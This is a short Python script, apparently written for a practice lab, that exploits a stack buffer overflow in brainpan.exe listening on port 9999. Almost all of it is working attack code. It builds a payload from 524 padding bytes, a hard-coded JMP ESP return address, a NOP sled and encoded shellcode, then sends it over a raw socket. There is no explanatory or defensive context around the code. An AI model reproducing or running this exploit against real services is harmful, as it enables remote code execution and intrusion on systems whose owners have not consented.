import socket

ip = '10.10.132.68'
porta = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, porta))
print("Connected")
s.recv(1024)

# badchar: \0x00
# brainpan.exe 0x311712f3

shellcode = (
"\xdd\xc5\xd9\x74\x24\xf4\x58\xba\xed\xd5\xcf\x14\x29\xc9"
"\xb1\x1f\x31\x50\x1a\x03\x50\x1a\x83\xc0\x04\xe2\x18\xbf"
"\xc5\x4a\xd3\x9b\x2d\x91\x40\x5f\x81\x3c\x64\xef\x43\x48"
"\x89\xc2\x0c\xdd\x12\xb5\x06\xe0\xbe\xb1\x7f\xe6\xbe\x38"
"\x3b\x6f\x5f\x50\x5d\x28\xcf\xf4\xf6\x41\x0e\xb5\x35\xd1"
"\x55\xfa\xbf\xcb\x1b\x8f\x02\x84\x01\x6f\x7d\x54\x1d\x1a"
"\x7d\x3e\x98\x53\x9e\x8f\x6b\xae\xe1\x75\xab\x48\x5f\x9e"
"\x0c\x19\x98\xd8\x52\x4d\xa7\x1a\xdb\x8e\x66\xf1\xd7\x91"
"\x8a\x0a\x57\x6c\x80\x93\x12\x4f\x62\x84\x47\xd9\x72\x3d"
"\xc5\xfd\xc4\x3d\xe4\x7e\xa1\x82\x8e\x7c\x55\xe3\xd6\x80"
"\xa9\xe4\x26\x38\xa8\xe4\x26\x3e\x66\x64"
)

print('Sending the shellcode...')
overflow = "A" * 524
overflow += "\xf3\x12\x17\x31"
overflow += "\x90" * 10
overflow += shellcode

s.send(f"{overflow}".encode("latin-1"))
data = s.recv(1024)
print(data.decode())